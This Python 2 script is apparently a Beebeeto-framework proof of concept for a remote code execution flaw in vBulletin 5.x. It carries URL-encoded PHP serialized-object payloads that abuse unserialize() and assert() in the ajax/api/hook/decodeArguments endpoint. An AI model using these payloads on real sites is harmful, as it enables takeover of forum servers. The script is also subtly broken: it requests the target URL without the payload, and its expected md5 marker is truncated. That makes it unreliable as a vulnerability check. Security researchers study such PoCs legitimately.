#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0151',
            'name': 'vBulletin 5.x.x ajax/api 远程代码执行漏洞 POC',
            'author': 'foundu',
            'create_date': '2015-11-13',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'vBulletin',
            'vul_version': ['5.x.x'],
            'type': 'Code Execution',
            'tag': ['vBulletin cms漏洞', 'ajax/api/hook/decodeArguments', '远程代码执行漏洞', 'php'],
            'desc': '''
                    vBulletin 程序在处理 Ajax API 调用的时候，使用 unserialize() 对传递的参数值进行了反序列化操作，
                    导致攻击者使用精心构造出的 Payload 直接导致代码执行。
                    ''',
            'references': ['http://blog.knownsec.com/2015/11/unserialize-exploit-with-vbulletin-5-x-x-remote-code-execution/'],
        },
    }


    @classmethod
    def verify(cls, args):
        url = args['options']['target']
        payloads = [("/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result"
                     "%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A11%3A%22vB_Database"
                     "%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22"
                     "free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00"
                     "%2A%00recordset%22%3Bs%3A16%3A%22var_dump%28md5%281%29%29%22%3B%7D"),
                    ("/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result"
                     "%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_My"
                     "SQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22"
                     "free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A"
                     "%00recordset%22%3Bs%3A16%3A%22var_dump%28md5%281%29%29%22%3B%7D")]
        for payload in payloads:
            verify_url = url + payload
            if args['options']['verbose']:
                print '[*] Request URL: ' + verify_url
            req = requests.get(url)
            if 'c4ca4238a0b923820dcc509a6f75849' in req.content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
            continue
        return args

    exploit = verify

if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())